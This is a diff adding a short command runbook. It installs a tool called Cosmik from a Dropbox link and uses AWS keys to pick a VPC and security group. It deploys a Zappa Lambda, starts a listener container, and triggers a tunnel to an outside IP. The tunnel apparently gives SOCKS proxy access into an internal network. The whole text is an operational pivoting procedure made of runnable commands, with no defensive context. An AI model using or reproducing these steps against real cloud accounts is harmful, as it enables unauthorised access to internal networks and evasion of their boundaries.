@@ -1,0 +1,71 @@
+~~~ Clean Up Docker Images ~~~
+
+docker-shark
+
+df -h
+
+
+~~~ Install Cosmik ~~~
+
+apt -y install virtualenv
+
+cd /opt
+
+wget https://www.dropbox.com/s/8ui6c5q1ajsljh0/cosmik-v0_1.tar.gz?dl=0
+
+mv cosmik-v0_1.tar.gz?dl=0 cosmik-v0_1.tar.gz
+
+md5sum "cosmik-v0_1.tar.gz"
+3ec1f3bad98402077f73de4a16ded7cd  cosmik-v0_1.tar.gz
+
+tar zxvf cosmik-v0_1.tar.gz
+
+cd cosmik-v0_1/
+
+
+~~~ Create Python Virtual Env ~~~
+
+virtualenv venv
+
+source venv/bin/activate
+
+pip install --no-cache-dir -r REQUIREMENTS.txt
+
+
+~~~ Use Cosmik ~~~
+
+python cosmik.py --access-key AKIA... --secret-key B0Rr...
+
+---> #) VPC: vpc-0f70bd0a04d9316b7 (10.0.0.0/16)
+# Input the number assoicated with this VPC
+
+---> #) Security Group: sg-059e58e8fb9290393 (bluelizardSecurityGroup)
+# Input the number assoicated with this Security Group
+
+
+~~~ Change Zappa Settings ~~~
+
+aws configure
+
+vi zappa_settings.json
+ 
+cat zappa_settings.json
+
+zappa deploy dev -s zappa_settings.json
+
+
+~~~ Setup Listener ~~~
+
+curl ipcurl.net/n
+
+sudo su -
+
+docker run --rm -it -p 1080:1080 -p 443:4433 --name arox klustic/arox
+
+
+~~~ Execute SOCKS ~~~
+
+curl https://z7ge0xmur9.execute-api.us-east-2.amazonaws.com/dev/socks/18.188.46.35:443
+
+http://10.0.2.36:8080
+
